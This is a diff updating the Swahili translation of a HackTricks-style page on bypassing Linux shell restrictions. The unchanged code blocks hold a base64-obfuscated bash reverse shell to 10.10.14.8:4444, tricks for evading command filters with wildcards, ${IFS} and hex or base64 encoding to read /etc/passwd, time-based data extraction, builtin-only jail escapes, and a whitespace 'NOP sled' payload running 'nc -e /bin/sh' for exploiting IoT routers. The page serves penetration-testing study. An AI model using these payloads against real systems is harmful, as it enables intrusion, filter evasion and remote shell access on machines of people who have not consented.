@@ -1,8 +1,8 @@
-# Bypass Linux Restrictions
+# Kupita Vizuizi vya Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Common Limitations Bypasses
+## Mbinu za Kupita Vizuizi vya Kawaida
 
 ### Reverse Shell
 ```bash
@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Short Rev shell
+### Rev shell Fupi
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Kupita Njia na maneno yaliyokatazwa
+### Njia za Bypass na maneno yaliyokatazwa
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Bypass nafasi zilizopigwa marufuku
+### Bypass nafasi zilizokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Kukwepa kwa usimbaji wa hex
+### Kukwepa kwa kutumia usimbaji wa hex
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -129,7 +129,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Utoaji wa data unaotegemea muda
+### Uondoaji wa data unaotegemea muda
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -144,8 +144,8 @@ Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
 
 ### Builtins
 
-Iwapo huwezi kutekeleza functions za nje na una ufikiaji wa **limited set of builtins to obtain RCE** pekee, kuna mbinu kadhaa muhimu za kufanya hivyo. Kwa kawaida **hutaweza kutumia zote** za **builtins**, kwa hivyo unapaswa **kujua chaguo zako zote** ili kujaribu kupita jail. Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
-Kwanza kabisa, kagua [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Kisha hapa kuna **mapendekezo** kadhaa:
+Iwapo huwezi kutekeleza functions za nje na una access tu kwa **seti ndogo ya builtins za kupata RCE**, kuna tricks kadhaa muhimu za kufanya hivyo. Kwa kawaida **hutaweza kutumia zote** za **builtins**, kwa hivyo unapaswa **kujua options zako zote** ili kujaribu kubypass jail. Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
+Kwanza kabisa, kagua zote [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Kisha hapa kuna baadhi ya **mapendekezo**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -296,15 +296,13 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya filesystem yenye **read-only na noexec protections** au hata kwenye **distroless container**, bado kuna njia za **kutekeleza arbitrary binaries, hata shell!:**
-
+Ikiwa uko ndani ya filesystem yenye **read-only na noexec protections** au hata kwenye distroless container, bado kuna njia za **ku-execute arbitrary binaries, hata shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & Bypass ya Jails Nyingine
-
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wakati vulnerability inakuruhusu kudhibiti kwa sehemu argument ambayo hatimaye hufika kwenye `system()` au shell nyingine, huenda usijue offset halisi ambapo execution huanza kusoma payload yako. NOP sleds za kawaida (kwa mfano, `\x90`) **hazifanyi kazi katika shell syntax**, lakini Bash itapuuza whitespace ya mwanzo bila madhara kabla ya kutekeleza command.
+Vulnerability inapokuruhusu kudhibiti kwa sehemu argument ambayo hatimaye kufikia `system()` au shell nyingine, huenda usijue offset kamili ambapo execution inaanza kusoma payload yako. NOP sleds za kawaida (kwa mfano, `\x90`) **hazifanyi kazi** katika shell syntax, lakini Bash itapuuza bila madhara whitespace iliyo mwanzoni kabla ya ku-execute command.
 
-Kwa hiyo unaweza kuunda *NOP sled ya Bash* kwa kuweka command yako halisi baada ya mfululizo mrefu wa spaces au tab characters:
+Kwa hivyo unaweza kuunda *NOP sled ya Bash* kwa kutanguliza command yako halisi kwa mfululizo mrefu wa spaces au tab characters:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ikiwa ROP chain (au primitive yoyote ya memory-corruption) itaweka instruction pointer mahali popote ndani ya space block, Bash parser huruka tu whitespace hadi kufikia `nc`, na kutekeleza command yako kwa kutegemewa.
+Ikiwa ROP chain (au primitive yoyote ya memory-corruption) itaelekeza instruction pointer mahali popote ndani ya space block, Bash parser hupita tu whitespace hadi ifikie `nc`, na kutekeleza command yako kwa uaminifu.
 
 Matumizi ya vitendo:
 
-1. **Memory-mapped configuration blobs** (k.m. NVRAM) zinazoweza kufikiwa na processes mbalimbali.
+1. **Memory-mapped configuration blobs** (kwa mfano NVRAM) zinazoweza kufikiwa na processes mbalimbali.
 2. Hali ambapo attacker hawezi kuandika NULL bytes ili ku-align payload.
-3. Vifaa vya embedded ambapo ni BusyBox `ash`/`sh` pekee vinavyopatikana – navyo hupuuza spaces za mwanzo.
+3. Vifaa vilivyopachikwa ambapo ni BusyBox `ash`/`sh` pekee inayopatikana – navyo hupuuza spaces zinazoongoza.
 
-> 🛠️  Unganisha trick hii na ROP gadgets zinazoita `system()` ili kuongeza sana reliability ya exploit kwenye IoT routers zenye memory ndogo.
+> 🛠️  Unganisha trick hii na ROP gadgets zinazoita `system()` ili kuongeza kwa kiasi kikubwa exploit reliability kwenye IoT routers zenye memory ndogo.
 
-## Marejeo na Zaidi
+## Marejeo
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
